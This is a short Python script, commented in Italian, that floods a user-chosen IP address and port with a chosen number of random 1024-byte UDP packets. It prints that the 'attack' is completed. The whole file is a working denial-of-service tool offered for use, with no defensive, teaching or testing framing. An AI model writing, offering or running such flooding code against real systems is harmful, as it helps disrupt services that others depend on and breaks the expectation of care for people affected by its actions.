import socket
import random
import threading

def send_packet(target_ip, target_port, num_packets):
    try:
        # Creazione di un socket UDP
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # Genera dati casuali da inviare
        bytes_to_send = random._urandom(1024)  # 1024 byte

        print(f"Inizio invio di {num_packets} pacchetti a {target_ip}:{target_port}")

        for i in range(num_packets):
            sock.sendto(bytes_to_send, (target_ip, target_port))
            if i % 100 == 0:
                print(f"Inviati {i} pacchetti...")

        print("Attacco completato!")

    except Exception as e:
        print(f"Errore: {e}")

if __name__ == "__main__":
    # Input dall'utente
    target_ip = input("Inserisci l'IP del target: ")
    target_port = int(input("Inserisci la porta del target: "))
    num_packets = int(input("Inserisci il numero di pacchetti da inviare: "))

    # Avvia un thread per inviare i pacchetti
    thread = threading.Thread(target=send_packet, args=(target_ip, target_port, num_packets))
    thread.start()
    thread.join()
